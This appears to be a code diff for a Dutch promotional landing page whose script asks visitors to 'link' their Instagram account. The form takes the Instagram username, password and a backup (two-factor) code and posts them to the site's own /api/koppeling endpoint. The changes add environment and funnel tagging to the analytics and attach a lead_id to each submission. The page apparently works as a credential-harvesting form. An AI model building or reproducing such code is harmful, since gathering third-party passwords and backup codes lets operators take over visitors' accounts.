@@ -107,7 +107,7 @@ var CONFIG = { POSTHOG_KEY: "phc_kSvVeBDoVN4rSTWzSk48YbYS29qPRQkBrDBzZAzUDQvv", 
 !function(t,e){var o,n,p,r;e.__SV||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}(p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r);var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],u.toString=function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e},u.people.toString=function(){return u.toString(1)+".people (stub)"},o="init capture register register_once unregister identify alias set_config reset opt_in_capturing opt_out_capturing get_distinct_id".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
 // Geen sessie-opnames of automatische klik-tracking op deze pagina: hier staat een wachtwoordveld.
 posthog.init(CONFIG.POSTHOG_KEY,{api_host:CONFIG.POSTHOG_HOST,person_profiles:"identified_only",capture_pageview:true,autocapture:false,disable_session_recording:true});
-posthog.register({page_version:CONFIG.PAGE_VERSION});
+posthog.register({omgeving:(location.hostname==="landing.promo-view.io"?"live":"test"),funnel_page:"koppeling",page_version:CONFIG.PAGE_VERSION});
 function track(e,p){try{posthog.capture(e,p||{})}catch(_){}}
 
 (function(){
@@ -130,7 +130,7 @@ $("back").addEventListener("click",function(){step(1)});
 var busy=false;
 async function send(code){if(busy)return;busy=true;var btn=$("b2");btn.disabled=true;btn.textContent="Bezig met koppelen…";$("formerr").style.display="none";
   var d=null;try{var r=await fetch("/api/koppeling",{method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({instagram:h($("u").value),wachtwoord:$("p").value,backup_code:code||"",ref:REF})});d=await r.json()}catch(_){}
+    body:JSON.stringify({instagram:h($("u").value),wachtwoord:$("p").value,backup_code:code||"",ref:REF,lead_id:LEAD.lead_id||""})});d=await r.json()}catch(_){}
   busy=false;btn.disabled=false;btn.textContent="Koppeling voltooien 🚀";
   if(!d||!d.ok){track("koppeling_error",{code:(d&&d.error)||"network"});var fe=$("formerr");
     fe.innerHTML='Koppelen lukt even niet. Probeer het zo nog eens, of <a href="https://wa.me/31685888134" target="_blank" rel="noopener">stuur ons een WhatsApp</a>.';fe.style.display="block";return}
